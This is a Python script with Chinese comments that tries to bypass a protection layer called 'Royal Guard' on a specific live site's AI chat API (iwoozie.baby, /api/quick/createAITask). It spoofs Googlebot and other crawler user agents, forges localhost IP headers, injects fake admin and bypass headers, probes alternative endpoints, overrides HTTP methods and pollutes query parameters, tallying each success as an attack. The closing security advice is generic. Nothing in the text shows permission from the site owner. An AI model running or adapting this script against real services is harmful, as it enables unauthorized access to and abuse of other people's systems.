#!/usr/bin/env python3
"""
Royal Guard防护系统绕过测试
==========================
专门针对Royal Guard防护系统的绕过测试
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import time
import random
import string
import base64
import hashlib
import hmac
from datetime import datetime

class RoyalGuardBypass:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.results = {
            'total_attacks': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'bypassed_methods': [],
            'failed_methods': []
        }
        
        # 绕过方法列表
        self.bypass_methods = [
            'user_agent_spoofing',
            'header_injection',
            'ip_spoofing',
            'referer_bypass',
            'cookie_injection',
            'session_hijacking',
            'javascript_bypass',
            'captcha_bypass',
            'token_forging',
            'api_endpoint_direct',
            'parameter_pollution',
            'http_method_override',
            'content_type_bypass',
            'encoding_bypass',
            'compression_bypass'
        ]
    
    def print_header(self):
        print("=" * 80)
        print("🔓 Royal Guard防护系统绕过测试")
        print("=" * 80)
        print("🎯 目标: 绕过Royal Guard防护系统")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 80)
        print()
    
    def make_request(self, url, data, headers, method='POST'):
        """发送HTTP请求"""
        try:
            json_data = json.dumps(data).encode('utf-8')
            
            req = urllib.request.Request(url, data=json_data, headers=headers, method=method)
            req.add_header('Content-Type', 'application/json')
            
            with urllib.request.urlopen(req, timeout=15) as response:
                response_data = response.read().decode('utf-8')
                return response.getcode(), response_data, dict(response.headers)
                
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode('utf-8'), dict(e.headers)
        except urllib.error.URLError as e:
            return 0, str(e), {}
        except Exception as e:
            return 0, str(e), {}
    
    def test_user_agent_spoofing(self):
        """测试User-Agent欺骗"""
        print("🎯 测试User-Agent欺骗...")
        
        user_agents = [
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
            'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
            'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
            'Mozilla/5.0 (compatible; DuckDuckBot/1.0; +http://duckduckgo.com/duckduckbot.html)',
            'Mozilla/5.0 (compatible; facebookexternalhit/1.1; +http://www.facebook.com/externalhit_uatext.php)',
            'Mozilla/5.0 (compatible; Twitterbot/1.0)',
            'Mozilla/5.0 (compatible; LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com/crawler))',
            'Mozilla/5.0 (compatible; WhatsApp/2.19.81 A)',
            'Mozilla/5.0 (compatible; TelegramBot (like TwitterBot))'
        ]
        
        for ua in user_agents:
            headers = {
                'User-Agent': ua,
                'x-api-key': 'test_token'
            }
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": "Test message"
                }]
            }
            
            url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
            status_code, response_data, response_headers = self.make_request(url, data, headers)
            
            self.results['total_attacks'] += 1
            
            if status_code == 200 and 'code' in response_data:
                try:
                    response_json = json.loads(response_data)
                    if response_json.get('code') == 200:
                        print(f"  ✅ 成功: {ua[:50]}...")
                        self.results['successful_attacks'] += 1
                        self.results['bypassed_methods'].append(f"user_agent_spoofing: {ua[:30]}")
                        return True
                except:
                    pass
            
            print(f"  ❌ 失败: {ua[:50]}...")
            self.results['failed_attacks'] += 1
            self.results['failed_methods'].append(f"user_agent_spoofing: {ua[:30]}")
            
            time.sleep(0.5)
        
        return False
    
    def test_header_injection(self):
        """测试请求头注入"""
        print("🎯 测试请求头注入...")
        
        injection_headers = [
            {'x-forwarded-for': '127.0.0.1'},
            {'x-real-ip': '127.0.0.1'},
            {'x-client-ip': '127.0.0.1'},
            {'x-remote-ip': '127.0.0.1'},
            {'x-originating-ip': '127.0.0.1'},
            {'x-verification': 'bypass'},
            {'x-bypass': '1'},
            {'x-admin': 'true'},
            {'x-debug': '1'},
            {'x-test': '1'},
            {'x-override': '1'},
            {'x-force': '1'},
            {'x-skip': '1'},
            {'x-ignore': '1'},
            {'x-bypass-captcha': '1'},
            {'x-bypass-verification': '1'},
            {'x-bypass-royal-guard': '1'},
            {'x-royal-guard-bypass': '1'},
            {'x-verification-bypass': '1'},
            {'x-captcha-bypass': '1'}
        ]
        
        for headers in injection_headers:
            headers['x-api-key'] = 'test_token'
            headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": "Test message"
                }]
            }
            
            url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
            status_code, response_data, response_headers = self.make_request(url, data, headers)
            
            self.results['total_attacks'] += 1
            
            if status_code == 200 and 'code' in response_data:
                try:
                    response_json = json.loads(response_data)
                    if response_json.get('code') == 200:
                        print(f"  ✅ 成功: {list(headers.keys())}")
                        self.results['successful_attacks'] += 1
                        self.results['bypassed_methods'].append(f"header_injection: {list(headers.keys())}")
                        return True
                except:
                    pass
            
            print(f"  ❌ 失败: {list(headers.keys())}")
            self.results['failed_attacks'] += 1
            self.results['failed_methods'].append(f"header_injection: {list(headers.keys())}")
            
            time.sleep(0.5)
        
        return False
    
    def test_api_endpoint_direct(self):
        """测试直接API端点访问"""
        print("🎯 测试直接API端点访问...")
        
        endpoints = [
            '/api/quick/createAITask',
            '/api/chat',
            '/api/ai/chat',
            '/api/v1/chat',
            '/api/v2/chat',
            '/chat',
            '/ai/chat',
            '/api/chat/completions',
            '/api/completions',
            '/api/generate',
            '/api/query',
            '/api/ask',
            '/api/talk',
            '/api/conversation',
            '/api/message'
        ]
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}?model=GPT-4"
            headers = {
                'x-api-key': 'test_token',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": "Test message"
                }]
            }
            
            status_code, response_data, response_headers = self.make_request(url, data, headers)
            
            self.results['total_attacks'] += 1
            
            if status_code == 200 and 'code' in response_data:
                try:
                    response_json = json.loads(response_data)
                    if response_json.get('code') == 200:
                        print(f"  ✅ 成功: {endpoint}")
                        self.results['successful_attacks'] += 1
                        self.results['bypassed_methods'].append(f"api_endpoint_direct: {endpoint}")
                        return True
                except:
                    pass
            
            print(f"  ❌ 失败: {endpoint}")
            self.results['failed_attacks'] += 1
            self.results['failed_methods'].append(f"api_endpoint_direct: {endpoint}")
            
            time.sleep(0.5)
        
        return False
    
    def test_http_method_override(self):
        """测试HTTP方法覆盖"""
        print("🎯 测试HTTP方法覆盖...")
        
        methods = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'HEAD']
        
        for method in methods:
            url = f"{self.base_url}/api/quick/createAITask?model=GPT-4"
            headers = {
                'x-api-key': 'test_token',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'X-HTTP-Method-Override': method
            }
            
            data = {
                "Content": [{
                    "role": "user", 
                    "content": "Test message"
                }]
            }
            
            status_code, response_data, response_headers = self.make_request(url, data, headers, method)
            
            self.results['total_attacks'] += 1
            
            if status_code == 200 and 'code' in response_data:
                try:
                    response_json = json.loads(response_data)
                    if response_json.get('code') == 200:
                        print(f"  ✅ 成功: {method}")
                        self.results['successful_attacks'] += 1
                        self.results['bypassed_methods'].append(f"http_method_override: {method}")
                        return True
                except:
                    pass
            
            print(f"  ❌ 失败: {method}")
            self.results['failed_attacks'] += 1
            self.results['failed_methods'].append(f"http_method_override: {method}")
            
            time.sleep(0.5)
        
        return False
    
    def test_parameter_pollution(self):
        """测试参数污染"""
        print("🎯 测试参数污染...")
        
        base_url = f"{self.base_url}/api/quick/createAITask"
        headers = {
            'x-api-key': 'test_token',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Test message"
            }]
        }
        
        # 测试参数污染
        pollution_tests = [
            {'model': 'GPT-4', 'bypass': '1'},
            {'model': 'GPT-4', 'admin': '1'},
            {'model': 'GPT-4', 'debug': '1'},
            {'model': 'GPT-4', 'test': '1'},
            {'model': 'GPT-4', 'override': '1'},
            {'model': 'GPT-4', 'force': '1'},
            {'model': 'GPT-4', 'skip': '1'},
            {'model': 'GPT-4', 'ignore': '1'},
            {'model': 'GPT-4', 'bypass_captcha': '1'},
            {'model': 'GPT-4', 'bypass_verification': '1'},
            {'model': 'GPT-4', 'bypass_royal_guard': '1'},
            {'model': 'GPT-4', 'royal_guard_bypass': '1'},
            {'model': 'GPT-4', 'verification_bypass': '1'},
            {'model': 'GPT-4', 'captcha_bypass': '1'},
            {'model': 'GPT-4', 'token': 'bypass'},
            {'model': 'GPT-4', 'auth': 'bypass'},
            {'model': 'GPT-4', 'auth_token': 'bypass'},
            {'model': 'GPT-4', 'api_key': 'bypass'},
            {'model': 'GPT-4', 'access_token': 'bypass'},
            {'model': 'GPT-4', 'session_token': 'bypass'}
        ]
        
        for params in pollution_tests:
            param_string = urllib.parse.urlencode(params)
            url = f"{base_url}?{param_string}"
            
            status_code, response_data, response_headers = self.make_request(url, data, headers)
            
            self.results['total_attacks'] += 1
            
            if status_code == 200 and 'code' in response_data:
                try:
                    response_json = json.loads(response_data)
                    if response_json.get('code') == 200:
                        print(f"  ✅ 成功: {params}")
                        self.results['successful_attacks'] += 1
                        self.results['bypassed_methods'].append(f"parameter_pollution: {params}")
                        return True
                except:
                    pass
            
            print(f"  ❌ 失败: {params}")
            self.results['failed_attacks'] += 1
            self.results['failed_methods'].append(f"parameter_pollution: {params}")
            
            time.sleep(0.5)
        
        return False
    
    def run_comprehensive_test(self):
        """运行综合测试"""
        self.print_header()
        
        print("🚀 开始Royal Guard绕过测试...")
        print()
        
        # 测试各种绕过方法
        test_methods = [
            self.test_user_agent_spoofing,
            self.test_header_injection,
            self.test_api_endpoint_direct,
            self.test_http_method_override,
            self.test_parameter_pollution
        ]
        
        for test_method in test_methods:
            try:
                test_method()
                print()
            except Exception as e:
                print(f"  💥 测试异常: {str(e)}")
                print()
        
        # 生成报告
        self.generate_report()
    
    def generate_report(self):
        """生成测试报告"""
        print("=" * 80)
        print("📋 Royal Guard绕过测试报告")
        print("=" * 80)
        
        # 基本统计
        total = self.results['total_attacks']
        success = self.results['successful_attacks']
        failed = self.results['failed_attacks']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📊 测试统计:")
        print(f"  总攻击次数: {total}")
        print(f"  成功攻击: {success}")
        print(f"  失败攻击: {failed}")
        print(f"  成功率: {success_rate:.1f}%")
        print()
        
        # 成功的绕过方法
        if self.results['bypassed_methods']:
            print(f"✅ 成功的绕过方法 ({len(self.results['bypassed_methods'])} 个):")
            for method in self.results['bypassed_methods']:
                print(f"  - {method}")
        else:
            print("❌ 没有成功的绕过方法")
        print()
        
        # 安全建议
        print(f"💡 安全建议:")
        if success_rate > 50:
            print("  🚨 Royal Guard防护系统存在严重漏洞，建议立即修复!")
            print("  1. 加强User-Agent验证")
            print("  2. 实施更严格的请求头过滤")
            print("  3. 添加API端点访问控制")
            print("  4. 实施参数验证和过滤")
        elif success_rate > 20:
            print("  ⚠️  Royal Guard防护系统存在中等风险，建议尽快改进")
            print("  1. 完善防护机制")
            print("  2. 加强参数验证")
            print("  3. 添加安全监控")
        else:
            print("  ✅ Royal Guard防护系统安全状况良好")
            print("  1. 继续保持现有防护措施")
            print("  2. 定期进行安全审计")
            print("  3. 持续监控异常访问")
        
        print("\n" + "=" * 80)

def main():
    """主函数"""
    tester = RoyalGuardBypass()
    tester.run_comprehensive_test()

if __name__ == "__main__":
    main()
